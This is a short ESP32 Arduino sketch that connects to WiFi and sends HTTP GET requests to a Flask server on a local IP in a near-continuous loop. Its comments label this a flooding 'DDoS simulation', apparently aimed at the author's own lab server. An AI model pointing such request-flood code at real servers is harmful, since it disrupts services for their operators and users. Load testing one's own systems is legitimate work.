#include <WiFi.h>
#include <HTTPClient.h>

// 🔐 WiFi credentials
const char* ssid = "OnePlus Nord CE4";
const char* password = "";

// 🎯 Your Flask server
const char* server = "http://10.221.202.11:5000";

void setup() {
  Serial.begin(115200);

  WiFi.begin(ssid, password);
  Serial.print("Connecting");

  while (WiFi.status() != WL_CONNECTED) {
    delay(300);
    Serial.print(".");
  }

  Serial.println("\n✅ Connected to WiFi");
}

void loop() {

  if (WiFi.status() == WL_CONNECTED) {

    HTTPClient http;

    // 🔥 Reuse connection for speed
    http.begin(server);

    int httpCode = http.GET();

    Serial.print("Flooding... Response: ");
    Serial.println(httpCode);

    http.end();
  }

  // 🔴 ULTRA FAST REQUESTS = DDoS SIMULATION
  delay(1);   // ⚠️ very aggressive (can also use delay(0))
}
